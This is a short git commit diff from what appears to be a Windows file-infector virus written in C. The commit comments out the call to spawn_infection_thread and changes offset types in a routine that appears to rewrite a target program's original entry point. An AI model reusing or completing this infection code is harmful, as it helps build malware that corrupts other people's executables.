16e2ba91afadd311e2e8d53905e7b0b7d4388644
Jakob Fischer <JakobFischer93@gmail.com>
2019-04-04 16:43:51 +0200

    Running again with cygwin/mingw.

--- src/main.c
+++ src/main.c
@@ -17,7 +17,7 @@ int main(int argc, char **argv) {
   assert(IS_32_BIT || IS_64_BIT);
   assert(!(IS_32_BIT && IS_64_BIT));
   assert(code_begin < code_end);
-  ASSERT_FUNCTION_IN_BOUNDARIES(spawn_infection_thread);
+  ASSERT_FUNCTION_IN_BOUNDARIES(spawn_infection_thread)
 
   if (IS_32_BIT) {
     printf("running 32 bit\n");
@@ -28,7 +28,7 @@ int main(int argc, char **argv) {
   PRINT_DEBUG("code_begin = 0x%p\n", code_begin);
   PRINT_DEBUG("code_end = 0x%p\n", code_end);
   PRINT_DEBUG("code_size = 0x%X\n", (uint32_t)((uint8_t*)code_end - (uint8_t*)code_begin));
-  spawn_infection_thread();
+  //spawn_infection_thread();
   system("pause");
   return 0;
 }
--- src/oep.c
+++ src/oep.c
@@ -8,8 +8,8 @@ uint32_t get_original_entry_point(void) {
 //TODO: handle 64 bit case
 uint8_t write_original_entry_point(uint32_t oep, void* targetCodeBegin) {
     uint32_t srcOep = get_original_entry_point();
-    uint32_t startOffset = (uint8_t*)get_original_entry_point - (uint8_t*)code_begin;
-    uint32_t stopOffset = (uint8_t*)write_original_entry_point - (uint8_t*)code_begin;
+    int32_t startOffset = (uint8_t*)get_original_entry_point - (uint8_t*)code_begin;
+    int32_t stopOffset = (uint8_t*)write_original_entry_point - (uint8_t*)code_begin;
     uint32_t* ptr = (uint32_t*)((uint8_t*)targetCodeBegin + startOffset);
     uint32_t* stop = (uint32_t*)((uint8_t*)targetCodeBegin + stopOffset);
     while (ptr < stop) {
